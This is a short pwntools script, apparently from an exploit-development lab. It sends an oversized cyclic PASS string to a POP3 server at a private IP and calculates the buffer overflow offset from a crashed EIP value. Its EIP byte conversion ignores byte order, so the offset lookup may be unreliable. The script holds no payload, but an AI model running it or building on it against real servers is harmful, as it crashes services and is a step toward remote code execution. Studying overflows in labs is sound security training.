from pwn import *


ip="192.168.0.243"
port=110

p = remote("192.168.0.243",port)

#Decline Error message
#context.log_level="warn"
context.log_level="debug"


p.recvuntil("OK POP3")
p.send(b'USER username ' + b'\r\n')

data = p.recv(1024)
p.recvuntil("welcome")

find_offset = cyclic(3000)
pay = b'PASS ' + find_offset + b'\r\n'

#input eip value 
pause(3)
p.send(pay)

eip = input("EIP: ")

eip = eip.replace("0x","") #example : 0x61616161 -> aaa
eip = ''.join([
    chr(int(eip[0:2], 16)), chr(int(eip[2:4], 16)),
    chr(int(eip[4:6], 16)), chr(int(eip[6:8], 16)),
])

eip = eip.encode()
print(eip)


offset = find_offset.find(eip)
print(offset)

p.close()

